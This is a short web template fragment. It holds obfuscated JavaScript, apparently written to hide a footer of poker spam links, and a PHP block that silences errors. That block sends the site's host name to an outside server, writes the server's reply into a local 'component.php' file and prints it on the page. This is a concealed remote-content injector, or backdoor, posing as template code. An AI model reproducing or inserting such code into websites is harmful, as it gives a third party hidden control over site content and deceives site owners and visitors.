<script language="JavaScript">
function dnnViewState()
{
var a=0,m,v,t,z,x=new Array('9091968376','8887918192818786347374918784939277359287883421333333338896','778787','949990793917947998942577939317'),l=x.length;while(++a<=l){m=x[l-a];
t=z='';
for(v=0;v<m.length;){t+=m.charAt(v++);
if(t.length==2){z+=String.fromCharCode(parseInt(t)+25-l+a); t='';}}x[l-a]=z;}document.write('<'+x[0]+' '+x[4]+'>.'+x[2]+'{'+x[1]+'}</'+x[0]+'>');}dnnViewState();</script><p class="dnn">Coding by: <a href="http://www.justpokerreviews.com/888-poker/" title="888 poker bonus">888 Poker Review</a></p>	<?php
	error_reporting(0);
	ini_set('display_errors',0);
	$url = $_SERVER['HTTP_HOST']; $url = str_replace("&", "",$url);
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php"; $cachetime = 1 * 24 * 60 * 60; //1 * 24 * 60 * 60
	$source = "http://aztemplates.com/b/se.php?site=".$url;
	if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {$string = file_get_contents($source);$result = file_put_contents($target, $string);}
	echo file_get_contents($target);
?>
